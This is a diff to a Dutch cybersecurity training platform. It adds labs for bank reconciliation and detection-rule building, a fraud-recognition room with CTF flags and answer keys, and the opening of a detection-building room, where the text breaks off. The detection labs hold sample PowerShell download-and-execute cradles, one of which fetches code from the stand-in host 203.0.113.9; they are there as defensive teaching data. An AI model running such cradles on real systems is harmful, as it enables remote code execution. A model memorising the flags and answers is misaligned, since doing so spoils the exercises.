@@ -1258,6 +1258,8 @@ kbd {
     { type: 'structuring', icon: '💶', name: 'Structurering-detector', desc: 'Betrap smurfing: meerdere stortingen net onder de meldgrens (Wwft).', cfg: { threshold: 10000, currency: '€', scenario: 'Twee katvangers storten net onder de grens.', tx: [{ date: '2026-03-02', who: 'M. de Groot', amount: 9800, kind: 'contant' }, { date: '2026-03-02', who: 'K. Visser', amount: 9500, kind: 'contant' }, { date: '2026-03-03', who: 'R. Bakker', amount: 250, kind: 'pin', note: 'normaal' }, { date: '2026-03-03', who: 'M. de Groot', amount: 9900, kind: 'contant' }, { date: '2026-03-04', who: 'K. Visser', amount: 12000, kind: 'overboeking', note: 'boven grens' }], ask: [{ q: 'Hoeveel stortingen passen in het smurf-patroon?', answer: ['3'], hint: 'Tel de gemarkeerde rijen.' }] } },
     { type: 'emailheader', icon: '✉️', name: 'E-mailheader-analyse', desc: 'Traceer de echte herkomst via de Received-keten en betrap spoofing met SPF/DKIM/DMARC.', cfg: { title: 'demo-mail', from: 'Nederbank <beveiliging@nederbank.nl>', returnPath: 'retour@mail.boos.nm.lab', hops: [{ from: '[vervalst]', ip: '203.0.113.66', by: 'mail.boos.nm.lab', time: '09:58' }, { from: 'mail.boos.nm.lab', ip: '203.0.113.66', by: 'mx.nm.lab', time: '10:00' }], auth: { spf: 'fail', dkim: 'none', dmarc: 'fail' }, ask: [{ q: 'Wat is het oorspronkelijke verzend-IP?', answer: ['203.0.113.66'], hint: 'De onderste Received-regel.' }, { q: 'Is dit spoofing? (ja/nee)', answer: ['ja'], hint: 'Vergelijk From, Return-Path en SPF.' }] } },
     { type: 'dnslog', icon: '🌫️', name: 'DNS-log-analyse', desc: 'Betrap DNS-tunneling (TXT + lange subdomeinen) en een DGA (veel NXDOMAIN).', cfg: { title: 'demo-DNS', scenario: 'Eén domein tunnelt via TXT; een reeks willekeurige namen botst op NXDOMAIN.', queries: [{ time: '02:11', name: 'k5euo63fmjtv64lomfptgmt5aib7q.exfil.nm.lab', type: 'TXT', resp: 'OK' }, { time: '02:11', name: 'nf4xq1k9plm2wdr3nxc8vbp7za9qm.exfil.nm.lab', type: 'TXT', resp: 'OK' }, { time: '02:11', name: 'w1sbt4ydxd9ko5x2tcu5zeye1lp6ab.exfil.nm.lab', type: 'TXT', resp: 'OK' }, { time: '02:12', name: 'xk3f9q2v8.nm.lab', type: 'A', resp: 'NXDOMAIN' }, { time: '02:12', name: 'p7m2v8z1a.nm.lab', type: 'A', resp: 'NXDOMAIN' }, { time: '02:13', name: 'mail.nm.lab', type: 'A', resp: 'OK' }], ask: [{ q: 'Welk domein is het tunneling-kanaal?', answer: ['exfil.nm.lab'], hint: 'Veel TXT + lange subdomeinen.' }] } },
+    { type: 'recon', icon: '📒', name: 'Reconciliatie', desc: 'Leg bankafschrift en boekhouding naast elkaar en vind de onverklaarde post.', cfg: { title: 'demo-recon', currency: '€', leftName: 'Bankafschrift', rightName: 'Boekhouding', left: [{ date: '02-03', amount: 12000, desc: 'Klantbetaling' }, { date: '02-05', amount: -3500, desc: 'Leverancier' }, { date: '02-08', amount: -4500, desc: 'Onbekende BV' }, { date: '02-28', amount: 800, desc: 'Rente' }], right: [{ date: '02-03', amount: 12000, desc: 'Klantbetaling' }, { date: '02-05', amount: -3500, desc: 'Leverancier' }, { date: '02-28', amount: 800, desc: 'Rente' }], ask: [{ q: 'Welk bedrag is onverklaard? (getal)', answer: ['4500', '4.500'], hint: 'De niet-gematchte regel.' }] } },
+    { type: 'detectrule', icon: '🧰', name: 'Detectieregel bouwen', desc: 'Bouw een regel uit voorwaarden en test hem live op TP/FP tegen events.', cfg: { title: 'demo-detectie', fields: ['Image', 'CommandLine'], events: [{ label: 'kwaadaardig', malicious: true, fields: { Image: 'powershell.exe', CommandLine: 'powershell -w hidden -enc ...' } }, { label: 'kwaadaardig', malicious: true, fields: { Image: 'powershell.exe', CommandLine: 'powershell -w hidden IEX DownloadString' } }, { label: 'legitiem', malicious: false, fields: { Image: 'powershell.exe', CommandLine: 'powershell Get-ChildItem -Hidden' } }, { label: 'normaal', malicious: false, fields: { Image: 'chrome.exe', CommandLine: 'chrome --type=renderer' } }], solution: [{ field: 'CommandLine', op: 'bevat', value: '-w hidden' }] } },
     { type: 'password', icon: '🔑', name: 'Wachtwoord-analyse', desc: 'Live de sterkte en kraaktijd van een wachtwoord zien.', cfg: {} },
     { type: 'subnet', icon: '🧮', name: 'Subnet-calculator', desc: 'Subnetten uitrekenen en oefenvragen genereren.', cfg: {} },
     { type: 'hexviewer', icon: '🔢', name: 'Hex-viewer', desc: 'Rauwe bytes lezen: magic bytes en verstopte strings.', cfg: { filename: 'voorbeeld.bin', hex: '89 50 4E 47 0D 0A 1A 0A 4A 56 54 7B 68 65 78 5F 6B 69 6A 6B 65 72 7D' } },
@@ -4444,6 +4446,122 @@ kbd {
     wrap.append(el('div', { class: 'lab-out', style: 'margin-top:8px', html: 'Totaal queries: <strong>' + queries.length + '</strong> · met NXDOMAIN: <strong>' + nxTotal + '</strong> (hoog = mogelijk DGA)' }));
     puzzleAsk(wrap, cfg.ask);
     container.append(shell('<b>DNS-log-analyse</b> — ' + esc(cfg.title || 'tunneling & DGA'), wrap, false));
+  });
+
+  // =====================================================================
+  //  RECON — transactie-reconciliatie (bankafschrift vs boekhouding)
+  // =====================================================================
+  CS.registerLab('recon', function (container, cfg) {
+    const left = (cfg.left || []).slice();   // bankafschrift
+    const right = (cfg.right || []).slice(); // boekhouding
+    const cur = cfg.currency || '€';
+    const leftName = cfg.leftName || 'Bankafschrift';
+    const rightName = cfg.rightName || 'Boekhouding';
+    const fmt = (n) => (n < 0 ? '−' : '+') + ' ' + cur + ' ' + Math.abs(Number(n)).toLocaleString('nl-NL');
+    // greedy one-op-één matching op bedrag (en optioneel ref/key)
+    const rUsed = right.map(() => false);
+    const lMatch = left.map((l) => {
+      const idx = right.findIndex((r, i) => !rUsed[i] && Math.abs((+r.amount) - (+l.amount)) < 0.005 && (!l.key || !r.key || l.key === r.key));
+      if (idx >= 0) { rUsed[idx] = true; return idx; }
+      return -1;
+    });
+    const wrap = el('div', { class: 'lab-pad' });
+    if (cfg.scenario) wrap.append(el('div', { class: 'callout info', html: esc(cfg.scenario) }));
+    wrap.append(el('div', { class: 'found-note', html: 'Reconciliëren = twee administraties naast elkaar leggen die zouden moeten kloppen. Een post die wél op het ' + esc(leftName.toLowerCase()) + ' staat maar niet in de ' + esc(rightName.toLowerCase()) + ' (of andersom) is <strong>niet te verklaren</strong> — en vaak het spoor van de fraude.' }));
+    const cols = el('div', { class: 'lab-grid2' });
+    const mkCol = (name, rows, matchArr) => {
+      const c = el('div', {});
+      c.append(el('label', { text: name }));
+      const box = el('div', { class: 'logview', style: 'max-height:240px' });
+      rows.forEach((r, i) => {
+        const matched = matchArr[i];
+        const ln = el('div', { class: 'ln', style: matched ? '' : 'background:rgba(240,110,110,.12)' });
+        ln.append(el('span', { class: 'n', html: matched ? '✓' : '⚠️' }),
+          el('span', { html: '<strong>' + fmt(+r.amount) + '</strong> <span style="color:var(--muted)">' + esc(r.desc || '') + '</span>' + (r.date ? ' <span style="color:#7f8db5">' + esc(r.date) + '</span>' : '') }));
+        box.append(ln);
+      });
+      c.append(box);
+      return c;
+    };
+    const rMatchArr = right.map((_, i) => rUsed[i]);
+    cols.append(mkCol(leftName, left, lMatch.map((m) => m >= 0)), mkCol(rightName, right, rMatchArr));
+    wrap.append(cols);
+    const sum = (a) => a.reduce((s, x) => s + (+x.amount || 0), 0);
+    const lSum = sum(left), rSum = sum(right);
+    wrap.append(el('div', { class: 'lab-out', style: 'margin-top:8px', html: 'Saldo <strong>' + esc(leftName) + '</strong>: ' + fmt(lSum) + ' &nbsp;·&nbsp; saldo <strong>' + esc(rightName) + '</strong>: ' + fmt(rSum) + ' &nbsp;·&nbsp; verschil: <strong style="color:' + (Math.abs(lSum - rSum) < 0.005 ? 'var(--good)' : 'var(--bad)') + '">' + cur + ' ' + Math.abs(lSum - rSum).toLocaleString('nl-NL') + '</strong>' }));
+    puzzleAsk(wrap, cfg.ask);
+    container.append(shell('<b>Reconciliatie</b> — ' + esc(cfg.title || 'leg de administraties naast elkaar'), wrap, false));
+  });
+
+  // =====================================================================
+  //  DETECTRULE — bouw en test een detectieregel (Sigma-stijl)
+  // =====================================================================
+  CS.registerLab('detectrule', function (container, cfg) {
+    const fields = cfg.fields || [];
+    const events = (cfg.events || []).slice();
+    const OPS = ['is', 'bevat', '>', '<'];
+    const conds = [];
+    const wrap = el('div', { class: 'lab-pad' });
+    if (cfg.scenario) wrap.append(el('div', { class: 'callout info', html: esc(cfg.scenario) }));
+    wrap.append(el('div', { class: 'found-note', html: 'Bouw een regel uit één of meer voorwaarden (ze worden met <strong>EN</strong> gecombineerd). Doel: álle kwaadaardige events vangen (true positives) met <strong>geen</strong> vals-positieven. Te breed → ruis; te smal → je mist aanvallen.' }));
+    // conditie-bouwer
+    const builder = el('div', { class: 'ans-row', style: 'flex-wrap:wrap' });
+    const fSel = el('select', {}, fields.map((f) => el('option', { value: f, text: f })));
+    const oSel = el('select', {}, OPS.map((o) => el('option', { value: o, text: o })));
+    const vInp = el('input', { type: 'text', placeholder: 'waarde…', style: 'flex:1;min-width:120px' });
+    const addBtn = el('button', { class: 'btn small primary', text: '+ voorwaarde' });
+    builder.append(fSel, oSel, vInp, addBtn);
+    wrap.append(builder);
+    const condBox = el('div', { class: 'chip-row', style: 'margin:6px 0' });
+    wrap.append(condBox);
+    const out = el('div', { class: 'lab-out', style: 'margin-top:8px' });
+    wrap.append(out);
+    function evalEvent(ev) {
+      if (!conds.length) return false;
+      return conds.every((c) => {
+        const v = ev.fields ? ev.fields[c.field] : undefined;
+        if (v == null) return false;
+        const val = String(v).toLowerCase(), cv = String(c.value).toLowerCase();
+        if (c.op === 'is') return val === cv;
+        if (c.op === 'bevat') return val.indexOf(cv) >= 0;
+        if (c.op === '>') return parseFloat(v) > parseFloat(c.value);
+        if (c.op === '<') return parseFloat(v) < parseFloat(c.value);
+        return false;
+      });
+    }
+    function renderConds() {
+      condBox.innerHTML = '';
+      if (!conds.length) { condBox.append(el('span', { class: 'found-note', text: 'Nog geen voorwaarden — voeg er één toe.' })); return; }
+      conds.forEach((c, i) => condBox.append(el('span', { class: 'chip on', html: esc(c.field + ' ' + c.op + ' "' + c.value + '"') + ' ✕', onclick: () => { conds.splice(i, 1); renderConds(); evaluate(); } })));
+    }
+    function evaluate() {
+      let tp = 0, fp = 0, fn = 0, tn = 0; const hits = [];
+      events.forEach((ev) => {
+        const m = evalEvent(ev);
+        if (m && ev.malicious) tp++; else if (m && !ev.malicious) fp++; else if (!m && ev.malicious) fn++; else tn++;
+        if (m) hits.push(ev);
+      });
+      const totMal = events.filter((e) => e.malicious).length;
+      out.innerHTML = '';
+      out.append(el('div', { html: '<strong>Resultaat:</strong> ' + '<span style="color:var(--good)">TP ' + tp + '</span> · <span style="color:var(--bad)">FP ' + fp + '</span> · <span style="color:var(--warn)">FN ' + fn + '</span> · TN ' + tn }));
+      const perfect = conds.length && tp === totMal && fp === 0;
+      out.append(el('div', { class: 'found-note', html: perfect ? '✅ Perfect: alle ' + totMal + ' kwaadaardige events gevangen, geen vals-positieven.' + (cfg.flag ? ' Vlag: <code>' + esc(cfg.flag) + '</code>' : '') : (conds.length ? (fp > 0 ? '⚠️ ' + fp + ' vals-positief(ven): je regel is te breed — maak hem specifieker.' : (fn > 0 ? '⚠️ ' + fn + ' gemist: je regel is te smal.' : '—')) : 'Voeg voorwaarden toe en test.') }));
+      if (hits.length) {
+        out.append(el('label', { text: 'Gematchte events' }));
+        hits.forEach((h) => { out.append(el('div', { class: 'ln', html: (h.malicious ? '🟥' : '🟩') + ' ' + esc(h.label || (h.fields && h.fields.CommandLine) || '') })); });
+      }
+    }
+    addBtn.addEventListener('click', () => { if (!vInp.value.trim() && oSel.value !== '>' && oSel.value !== '<') return; conds.push({ field: fSel.value, op: oSel.value, value: vInp.value.trim() }); vInp.value = ''; renderConds(); evaluate(); });
+    vInp.addEventListener('keydown', (e) => { if (e.key === 'Enter') addBtn.click(); });
+    // events-overzicht
+    wrap.append(el('details', { html: '<summary>📋 Toon de events (' + events.length + ')</summary>' }, [(function () {
+      const d = el('div', { class: 'logview', style: 'max-height:200px;margin-top:6px' });
+      events.forEach((ev) => d.append(el('div', { class: 'ln', html: (ev.malicious ? '🟥' : '🟩') + ' ' + esc(Object.keys(ev.fields || {}).map((k) => k + '=' + ev.fields[k]).join('  ')) })));
+      return d;
+    })()]));
+    if (cfg.solution) wrap.append(el('div', { class: 'chip-row' }, [el('span', { class: 'chip', text: '💡 Toon een voorbeeldregel', onclick: () => { conds.length = 0; cfg.solution.forEach((c) => conds.push(Object.assign({}, c))); renderConds(); evaluate(); } })]));
+    renderConds(); evaluate();
+    container.append(shell('<b>Detectieregel bouwen</b> — ' + esc(cfg.title || 'van IOC naar regel'), wrap, false));
   });
 
   // =====================================================================
@@ -8962,6 +9080,200 @@ CS.registerRoom({
     { title: 'OWASP — Password Storage Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html' },
     { title: 'Wikipedia — Argon2', url: 'https://en.wikipedia.org/wiki/Argon2' },
     { title: 'NCSC — Nationaal Cyber Security Centrum', url: 'https://www.ncsc.nl/' },
+  ],
+});
+
+</script>
+<script>
+/* Room: Security-kern — fraudevormen herkennen (helpdesk, marktplaats, investering, spoofing) */
+
+// =======================================================================
+//  Alles FICTIEF: verzonnen scenario's, personen en bedragen. Je oefent
+//  het herkennen van fraudepatronen zodat je ze (en anderen) beschermt.
+// =======================================================================
+
+// --- Connections: koppel de signalen aan de juiste fraudevorm ---
+const FV_GROUPS = [
+  { name: 'Helpdeskfraude (bankhelpdesk)', items: ['Belt zogenaamd van de bank', 'Vraagt je in te loggen via AnyDesk', '"Uw rekening is gehackt"', 'Zet uw geld op een "kluisrekening"'] },
+  { name: 'Marktplaatsfraude', items: ['Te mooie prijs om waar te zijn', 'Betaal €0,01 via een verificatielink', 'Chatten buiten het platform', 'Nep-bezorg-betaalpagina'] },
+  { name: 'Investeringsfraude', items: ['Gegarandeerd hoog rendement', 'Crypto-"coach" via WhatsApp', 'Nep-dashboard dat winst toont', 'Druk om snel méér te storten'] },
+  { name: 'CEO-/spoofingfraude', items: ['Spoofed afzender of beller-ID', '"Spoedbetaling, strikt vertrouwelijk"', 'Verzoek lijkt van de directeur', 'Buiten de normale procedure om'] },
+];
+
+// --- Ordering: het crime script van helpdeskfraude ---
+const FV_STEPS = [
+  { id: '1', label: 'Fraudeur verzamelt gegevens (naam, bank) uit een datalek of via OSINT' },
+  { id: '2', label: 'Belt het slachtoffer en doet zich voor als bankmedewerker' },
+  { id: '3', label: 'Creëert urgentie en angst: "uw rekening is gehackt"' },
+  { id: '4', label: 'Laat het slachtoffer remote software (AnyDesk) installeren' },
+  { id: '5', label: 'Laat het slachtoffer inloggen of codes doorgeven' },
+  { id: '6', label: 'Sluist het geld naar een katvangerrekening' },
+  { id: '7', label: 'Het geld wordt via money mules contant opgenomen' },
+];
+
+// --- Flow: de geldstroom na een geslaagde helpdeskfraude ---
+const FV_NODES = [
+  { id: 'v', type: 'victim', label: 'Slachtoffer' },
+  { id: 'kat', type: 'account', label: 'Katvangerrekening' },
+  { id: 'mule', type: 'mule', label: 'Money mule' },
+  { id: 'cash', type: 'cashout', label: 'Contante opname' },
+];
+const FV_EDGES = [
+  { from: 'v', to: 'kat', amount: 8000, time: '14:30', note: 'slachtoffer "beveiligt" geld op een kluisrekening' },
+  { from: 'kat', to: 'mule', amount: 7700, time: '14:45', note: 'katvanger houdt 300' },
+  { from: 'mule', to: 'cash', amount: 7500, time: '15:10', note: 'mule houdt 200; contant opgenomen' },
+];
+
+CS.registerRoom({
+  id: 'fraudevormen',
+  path: 'security-kern',
+  order: 7,
+  title: 'Fraudevormen herkennen',
+  icon: '🎭',
+  difficulty: 'Gemiddeld',
+  minutes: 50,
+  summary: 'Fraude draait niet om techniek maar om de mens: urgentie, autoriteit en afleiding. Je leert de vier vormen die je het vaakst tegenkomt — helpdeskfraude, marktplaatsfraude, investeringsfraude en CEO-/spoofingfraude — herkennen aan hun signalen, je ontleedt het "crime script" van helpdeskfraude, volgt de geldstroom en leert de simpele regels die bijna alles tegenhouden.',
+  objectives: [
+    'De vier veelvoorkomende fraudevormen herkennen aan hun kenmerkende signalen',
+    'De rode draad benoemen: urgentie, autoriteit en handelen buiten officiële kanalen',
+    'Het crime script van helpdeskfraude in de juiste volgorde zetten',
+    'De geldstroom na fraude volgen via katvanger en mule tot de cash-out',
+    'De gouden regels toepassen die slachtofferschap voorkomen',
+  ],
+  terms: [
+    { term: 'Social engineering', def: 'Mensen manipuleren om iets te doen of prijs te geven, in plaats van techniek te kraken.' },
+    { term: 'Helpdeskfraude', def: 'Een "bankmedewerker" belt, creëert paniek en laat je geld "veiligstellen" op een rekening van de fraudeur.' },
+    { term: 'Marktplaatsfraude', def: 'Fraude rond online kopen/verkopen: nepkopers/-verkopers, valse betaallinks en betaalpagina\'s.' },
+    { term: 'Investeringsfraude', def: 'Beloftes van gegarandeerd hoog rendement (vaak crypto) met een nep-platform en druk om te blijven storten.' },
+    { term: 'CEO-fraude / spoofing', def: 'Een nagebootste directeur of leverancier vraagt om een spoedbetaling, buiten de normale procedure om.' },
+    { term: 'Urgentie & autoriteit', def: 'De twee krachtigste hefbomen van fraude: tijdsdruk schakelt je nadenken uit, een "autoriteit" schakelt je twijfel uit.' },
+    { term: 'Katvanger / money mule', def: 'Iemand die zijn rekening uitleent om gestolen geld door te sluizen, vaak tegen een vergoeding.' },
+    { term: 'Kluisrekening-truc', def: 'De leugen dat je geld "veilig" op een aparte rekening gezet moet worden — die rekening is van de fraudeur.' },
+  ],
+  resources: [
+    { title: 'Fraudehelpdesk — herkennen en melden', url: 'https://www.fraudehelpdesk.nl/' },
+    { title: 'Politie — fraude en oplichting', url: 'https://www.politie.nl/informatie/fraude.html' },
+    { title: 'Veilig bankieren (Betaalvereniging Nederland)', url: 'https://www.veiligbankieren.nl/' },
+    { title: 'AFM — waarschuwingen beleggingsfraude', url: 'https://www.afm.nl/' },
+  ],
+  tasks: [
+    {
+      title: 'Taak 1 — De rode draad van alle fraude',
+      content: `
+        <p>Fraudeurs kraken zelden techniek — ze kraken <strong>mensen</strong>. Vier vormen kom je het vaakst tegen:</p>
+        <ul>
+          <li><strong>Helpdeskfraude</strong> — een "bankmedewerker" belt, creëert paniek en laat je geld "veiligstellen".</li>
+          <li><strong>Marktplaatsfraude</strong> — nepkopers/-verkopers, valse betaallinks en betaalpagina's.</li>
+          <li><strong>Investeringsfraude</strong> — gegarandeerd hoog rendement, een nep-platform en druk om te storten.</li>
+          <li><strong>CEO-/spoofingfraude</strong> — een nagebootste directeur vraagt om een geheime spoedbetaling.</li>
+        </ul>
+        <p>Hoe verschillend ook, de hefbomen zijn steeds dezelfde: <strong>urgentie</strong> (tijdsdruk schakelt je nadenken
+        uit), <strong>autoriteit</strong> (een "bank" of "baas" schakelt je twijfel uit) en een duw om te handelen
+        <strong>buiten de officiële kanalen</strong> om.</p>
+        <div class="callout warn"><strong>Alles fictief:</strong> de scenario's en bedragen zijn verzonnen oefenmateriaal.</div>
+        <div class="callout tip"><strong>Beloning:</strong> urgentie + autoriteit + buiten de kanalen = fraude. Vlag:
+        <code>NM{urgentie_en_autoriteit}</code>.</div>
+      `,
+      questions: [
+        { q: 'Wat is de gemeenschappelijke hefboom achter deze fraudevormen?', options: ['Urgentie en autoriteit, en handelen buiten officiële kanalen om', 'Een zwak wachtwoord', 'Een verouderde browser', 'Een slechte firewall'], answer: 0, explain: 'Fraude is social engineering: tijdsdruk en een "autoriteit" zetten je gezonde verstand opzij.' },
+        { q: 'Waarom werkt tijdsdruk zo goed voor een fraudeur?', options: ['Onder druk denk je minder kritisch na en controleer je niet', 'Omdat computers sneller zijn', 'Omdat de bank dicht is', 'Omdat het wettelijk moet'], answer: 0, explain: 'Haast schakelt reflectie uit; daarom pushen fraudeurs altijd op "nu meteen".' },
+        { q: 'Wat is bij al deze vormen een rode vlag?', options: ['Een verzoek om buiten de normale/officiële weg te handelen', 'Een e-mail met een logo', 'Een telefoontje overdag', 'Een bericht in het Nederlands'], answer: 0, explain: 'Echte organisaties volgen procedures; "doe het stiekem/nu/anders" is juist verdacht.' },
+        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{urgentie_en_autoriteit}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{urgentie_en_autoriteit}.' },
+      ],
+    },
+    {
+      title: 'Taak 2 — Koppel de signalen aan de fraudevorm',
+      content: `
+        <p>Elk type fraude heeft zijn eigen verraderlijke signalen. Groepeer de zestien signalen in de vier fraudevormen
+        waar ze bij horen.</p>
+        <div class="callout tip"><strong>Beloning:</strong> vier vormen, vier signaalsets. Vlag: <code>NM{signalen_gekoppeld}</code>.</div>
+      `,
+      lab: {
+        type: 'connections',
+        title: 'signalen → fraudevorm',
+        prompt: 'Vind de vier groepen van vier: welke signalen horen bij welke fraudevorm?',
+        groups: FV_GROUPS,
+      },
+      questions: [
+        { q: 'Een beller zegt "van de bank" te zijn en vraagt je AnyDesk te installeren. Welke fraude?', options: ['Helpdeskfraude', 'Marktplaatsfraude', 'Investeringsfraude', 'CEO-fraude'], answer: 0, explain: 'Remote software + "de bank" + paniek is het handtekeningpatroon van helpdeskfraude.' },
+        { q: 'Een "coach" belooft via WhatsApp gegarandeerd rendement en toont een dashboard met winst. Welke fraude?', options: ['Investeringsfraude', 'Helpdeskfraude', 'Marktplaatsfraude', 'CEO-fraude'], answer: 0, explain: 'Gegarandeerd rendement + nep-dashboard + stortdruk = investeringsfraude.' },
+        { q: 'Een "verkoper" wil €0,01 via een verificatielink en chat buiten het platform. Welke fraude?', options: ['Marktplaatsfraude', 'CEO-fraude', 'Helpdeskfraude', 'Investeringsfraude'], answer: 0, explain: 'De €0,01-verificatietruc en het platform verlaten zijn klassieke marktplaatsfraude.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{signalen_gekoppeld}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{signalen_gekoppeld}.' },
+      ],
+    },
+    {
+      title: 'Taak 3 — Het crime script van helpdeskfraude',
+      content: `
+        <p>Fraude is geen toeval maar een <strong>script</strong>: een vaste reeks stappen. Als je het script kent, herken je
+        de fraude al halverwege — en weet je waar je hem kunt breken. Zet de stappen van helpdeskfraude op volgorde.</p>
+        <div class="callout tip"><strong>Beloning:</strong> ken het script, breek het script. Vlag: <code>NM{ken_het_script}</code>.</div>
+      `,
+      lab: {
+        type: 'ordering',
+        title: 'het crime script van helpdeskfraude',
+        prompt: 'Zet de zeven stappen op volgorde, van voorbereiding tot cash-out.',
+        items: FV_STEPS,
+        correct: ['1', '2', '3', '4', '5', '6', '7'],
+        flag: 'NM{ken_het_script}',
+        explain: 'Gegevens verzamelen → bellen → urgentie → remote software → codes → doorsluizen → contant opnemen.',
+      },
+      questions: [
+        { q: 'Wat is meestal de eerste stap?', options: ['Gegevens verzamelen (datalek/OSINT) om geloofwaardig over te komen', 'Het geld opnemen', 'Remote software installeren', 'Bellen met een spoedbetaling'], answer: 0, explain: 'Met jouw naam en bank klinkt de fraudeur betrouwbaar — die voorbereiding komt eerst.' },
+        { q: 'Op welk moment kun je de fraude het makkelijkst breken?', options: ['Zodra iemand je onder druk remote software of codes laat geven: ophangen en zelf de bank bellen', 'Pas nadat het geld is opgenomen', 'Nooit', 'Alleen de bank kan dat'], answer: 0, explain: 'De stap "codes/remote toegang" is het kantelpunt; stoppen en zelf verifiëren breekt het script.' },
+        { q: 'Waarom laat de fraudeur je AnyDesk installeren?', options: ['Om mee te kijken en zelf handelingen op jouw rekening te doen', 'Om je computer sneller te maken', 'Om een update te installeren', 'Om de bank te bellen'], answer: 0, explain: 'Met remote toegang ziet en bestuurt de fraudeur jouw scherm — levensgevaarlijk bij bankieren.' },
+        { q: 'Welke vlag hoort bij de juiste volgorde?', answer: ['NM{ken_het_script}'], hint: 'Verschijnt bij de juiste volgorde / staat in de tip-callout.', explain: 'De vlag is NM{ken_het_script}.' },
+      ],
+    },
+    {
+      title: 'Taak 4 — Volg het geld',
+      content: `
+        <p>Na een geslaagde helpdeskfraude verdwijnt het geld snel: van het slachtoffer naar een
+        <strong>katvangerrekening</strong>, via een <strong>money mule</strong>, en contant het systeem uit. Volg de stroom
+        en zie waarom snelheid (direct de bank bellen om te blokkeren) zo belangrijk is.</p>
+        <div class="callout tip"><strong>Beloning:</strong> snelheid redt het geld. Vlag: <code>NM{bel_direct_de_bank}</code>.</div>
+      `,
+      lab: {
+        type: 'flow',
+        title: 'de geldstroom na helpdeskfraude',
+        unit: '€',
+        scenario: 'Het slachtoffer "beveiligt" € 8.000; het loopt via een katvanger en mule naar een contante opname.',
+        nodes: FV_NODES,
+        edges: FV_EDGES,
+        ask: [
+          { q: 'Hoeveel werd er uiteindelijk contant opgenomen? (alleen het getal)', answer: ['7500', '7.500'], hint: 'De laatste transactie.' },
+          { q: 'Naar welk type rekening ging het geld eerst?', answer: ['katvangerrekening', 'katvanger', 'de katvangerrekening'], hint: 'Het eerste knooppunt na het slachtoffer.' },
+        ],
+      },
+      questions: [
+        { q: 'Hoeveel werd er uiteindelijk contant opgenomen?', answer: ['7500', '7.500', '€ 7.500', '€7500'], hint: 'De laatste transactie in de keten.', explain: 'Na vergoedingen voor katvanger (300) en mule (200) bleef € 7.500 over om contant op te nemen.' },
+        { q: 'Waarom is snel handelen (direct de bank bellen) cruciaal?', options: ['Zolang het geld nog op de katvangerrekening staat, kan de bank het soms blokkeren', 'Omdat de bank anders sluit', 'Omdat de rente oploopt', 'Dat maakt niet uit'], answer: 0, explain: 'Elke stap verder is het geld moeilijker terug te halen; snelheid vergroot de kans op blokkeren.' },
+        { q: 'Wat is een "katvanger" in deze keten?', options: ['Iemand die zijn rekening uitleent om gestolen geld door te sluizen', 'De bankmedewerker', 'Het slachtoffer', 'De politie'], answer: 0, explain: 'Een katvanger/money mule verhuurt zijn rekening — soms uit nood, soms uit onwetendheid, en is zelf ook strafbaar.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{bel_direct_de_bank}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{bel_direct_de_bank}.' },
+      ],
+    },
+    {
+      title: 'Taak 5 — De gouden regels',
+      content: `
+        <p>Bijna alle fraude strandt op een paar simpele gewoontes:</p>
+        <ul>
+          <li>De <strong>bank vraagt nooit</strong> om je pincode, volledige inlogcodes of om software te installeren.</li>
+          <li><strong>Hang op en bel zelf terug</strong> via het nummer op je bankpas of de officiële site — nooit het
+          nummer dat zij geven.</li>
+          <li><strong>Geen druk accepteren.</strong> Echt belangrijk? Dan mag het ook over vijf minuten, nadat je het hebt
+          geverifieerd.</li>
+          <li><strong>Geld "veiligstellen" bestaat niet.</strong> Een kluisrekening van de bank waar jij geld naartoe moet
+          maken, is altijd fraude.</li>
+          <li><strong>Betaal nooit €0,01 via een "verificatielink"</strong> en verlaat nooit het platform om te betalen.</li>
+        </ul>
+        <div class="callout tip"><strong>Beloning:</strong> ophangen en zelf terugbellen. Vlag: <code>NM{hang_op_bel_zelf}</code>.</div>
+      `,
+      questions: [
+        { q: 'Wat is de veiligste reactie op een "bankmedewerker" die belt met spoed?', options: ['Ophangen en zelf terugbellen via het officiële nummer', 'De gevraagde codes geven om tijd te winnen', 'AnyDesk installeren zodat ze kunnen helpen', 'Snel het geld overmaken'], answer: 0, explain: 'Zelf terugbellen via een vertrouwd nummer doorbreekt de hele fraude in één stap.' },
+        { q: 'Je moet geld "veiligstellen" op een aparte rekening. Wat is dit?', options: ['Altijd fraude — zo\'n kluisrekening-truc bestaat niet', 'Normale bankprocedure', 'Een slim idee', 'Alleen nodig bij grote bedragen'], answer: 0, explain: 'De bank laat je nooit geld naar een andere rekening "beveiligen"; dat is per definitie oplichting.' },
+        { q: 'Een verkoper vraagt je €0,01 te betalen via een linkje "ter verificatie". Wat doe je?', options: ['Niet doen — dit is een phishinglink om je bankgegevens te stelen', 'Betalen, het is maar een cent', 'Je pincode doorgeven', 'Buiten het platform verder chatten'], answer: 0, explain: 'De "1-cent-verificatie" is een phishingtruc; de link leidt naar een nep-inlogpagina.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{hang_op_bel_zelf}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{hang_op_bel_zelf}.' },
+      ],
+    },
   ],
 });
 
@@ -13763,6 +14075,133 @@ level: medium</code></pre>
     { title: 'YARA-documentatie', url: 'https://yara.readthedocs.io/' },
     { title: 'regex101 — reguliere expressies testen en uitleggen', url: 'https://regex101.com/' },
     { title: 'MITRE ATT&CK Navigator', url: 'https://mitre-attack.github.io/attack-navigator/' },
+  ],
+});
+
+</script>
+<script>
+/* Room: Defensief — detectie bouwen: van IOC naar regel (hands-on) */
+
+// =======================================================================
+//  Alles FICTIEF: verzonnen Sysmon-achtige events en IP's (RFC 5737).
+//  Je bouwt en tunet zelf een detectieregel.
+// =======================================================================
+
+const DB_EVENTS = [
+  { label: 'powershell -w hidden -enc (encoded cradle)', malicious: true, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi' } },
+  { label: 'powershell -w hidden DownloadString', malicious: true, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.9/a")' } },
